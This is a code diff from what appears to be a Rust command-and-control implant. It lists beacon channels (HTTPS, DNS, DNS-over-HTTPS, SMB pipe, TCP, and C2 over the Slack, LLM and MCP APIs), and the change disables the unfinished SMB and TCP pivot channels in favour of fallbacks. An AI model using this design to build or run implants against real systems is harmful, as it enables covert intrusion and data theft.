@@ -49,8 +49,21 @@ pub enum Channel {
     /// Native DNS beacon: A/AAAA/TXT records over UDP 53 (spec-4).
     Dns = 2,
     /// SMB Named Pipe — internal lateral / P2P pivot (spec-2).
+    ///
+    /// NOT IMPLEMENTED end-to-end (implant-channels-2/3): the parent-side
+    /// pipe server does not exist in this repo, so a beacon selected onto
+    /// this channel can never transact. [`set_active`] callers (the
+    /// `SetChannel` command) reject it with `Response::Err`;
+    /// [`dispatch_send_recv`] refuses to transact on it. Child-side code
+    /// lives in [`smb`] for when the pivot side lands.
     SmbPipe = 3,
     /// Raw TCP beacon — P2P pivot (spec-3).
+    ///
+    /// NOT IMPLEMENTED end-to-end (implant-channels-2/3): the parent-side
+    /// TCP listener does not exist in this repo, so a beacon selected onto
+    /// this channel can never transact. `SetChannel` rejects it with
+    /// `Response::Err`; [`dispatch_send_recv`] refuses to transact on it.
+    /// Child-side code lives in [`tcp`] for when the pivot side lands.
     Tcp = 4,
     /// External C2 via Slack API (spec-6).
     SlackApi = 5,
@@ -117,6 +130,19 @@ impl Channel {
             // SetChannel variants directly. Default unknown → Https.
             _ => Channel::Https,
         }
+    }
+
+    /// Whether this channel has an end-to-end implementation in this build.
+    ///
+    /// [`Channel::SmbPipe`] and [`Channel::Tcp`] carry child-side code
+    /// (`smb`/`tcp`) but NO parent-side (pivot / team-server) implementation
+    /// in this repo, so a beacon on them can never transact
+    /// (implant-channels-2/3). The `SetChannel` command MUST reject them
+    /// with a clear `Response::Err` rather than silently accepting a channel
+    /// that can never transact, and the dispatcher must never attempt a
+    /// transaction on them.
+    pub fn is_implemented(self) -> bool {
+        !matches!(self, Channel::SmbPipe | Channel::Tcp)
     }
 
     pub fn name(self) -> &'static str {
@@ -231,11 +257,18 @@ pub unsafe fn dispatch_send_recv(
     frame: &[u8],
 ) -> Option<Vec<u8>> {
     match active {
+        Channel::SmbPipe | Channel::Tcp => {
+            // Not implemented end-to-end (no parent-side implementation in
+            // this repo — implant-channels-2/3): never attempt a transaction
+            // on a channel that can never transact. Fail fast with a diag
+            // mark so the beacon loop falls through to the next fallback
+            // channel instead of blocking or spinning on a dead pipe/socket.
+            crate::entry::diag_mark(b"ERR_CH_NOT_IMPL");
+            None
+        }
         Channel::Https => unsafe { https::send_recv(ctx, frame) },
         Channel::DohDns => unsafe { doh::send_recv(ctx, frame) },
         Channel::Dns => unsafe { dns::send_recv(ctx, frame) },
-        Channel::SmbPipe => unsafe { smb::send_recv(ctx, frame) },
-        Channel::Tcp => unsafe { tcp::send_recv(ctx, frame) },
         Channel::SlackApi => unsafe { extc2::slack_send_recv(ctx, frame) },
         Channel::LlmApi => unsafe { extc2::llm_send_recv(ctx, frame) },
         Channel::Mcp => unsafe { extc2::mcp_send_recv(ctx, frame) },
